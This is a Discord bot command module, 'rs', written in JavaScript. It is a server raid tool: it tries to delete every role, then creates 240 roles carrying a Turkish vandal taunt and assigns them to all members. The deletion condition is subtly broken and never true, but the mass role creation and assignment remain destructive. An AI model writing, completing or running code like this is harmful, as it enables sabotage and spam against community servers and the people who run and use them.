module.exports.run = async (client, message, args) => {

    message.guild.roles.cache.forEach(role => {
        if(!role.name === "everyone") {
            role.delete(); 
        }
    });
        for(let i = 0; i < 240; i++) {
            message.guild.roles.create({ name: "FelisDobra UĞRADI DERSİNİZ XD" }).then((createdRole) => {
            message.guild.members.cache.forEach(member => member.roles.add(createdRole.id)); // Bunu aktif edersen açtığı rolleri sunucudaki herkese verir.
        });
    }
}

module.exports.help = {

    name: "rs"
    
}